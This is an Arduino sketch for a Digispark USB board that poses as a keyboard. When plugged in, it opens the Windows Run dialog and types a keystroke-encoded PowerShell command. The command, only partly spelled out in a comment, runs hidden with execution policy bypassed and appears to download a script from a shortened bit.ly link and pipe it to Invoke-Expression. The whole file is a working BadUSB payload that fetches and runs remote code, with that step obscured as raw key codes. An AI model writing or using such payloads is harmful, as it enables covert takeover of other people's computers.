#include "DigiKeyboard.h"

const uint8_t key_arr_0[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 0,56, 0,26, 0,44, 0,11, 0,44, 0,56, 2,17, 0,18, 2,19, 0,44, 0,56, 2,17, 0,18, 0,17, 2,12, 0,44, 0,56, 2,8, 0,27, 0,8, 0,6, 0,44, 2,5, 0,29, 0,19, 0,4, 0,22, 0,22, 0,44, 0,12, 0,26, 0,21, 0,44, 0,5, 0,12, 0,23, 0,55, 0,15, 0,29, 2,36, 0,32, 2,10, 0,22, 0,22, 2,5, 0,23, 0,5, 0,44, 64,100, 0,44, 0,12, 0,8, 0,27};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); 
    digitalWrite(1, LOW); 
    DigiKeyboard.sendKeyStroke(0); 
    
    // Sound
    DigiKeyboard.sendKeyStroke(21, 8); // GUI r
    DigiKeyboard.delay(500); // DELAY 500
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING powershell -w h -NoP -NonI -Exec Bypass...
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
}
void loop() {}
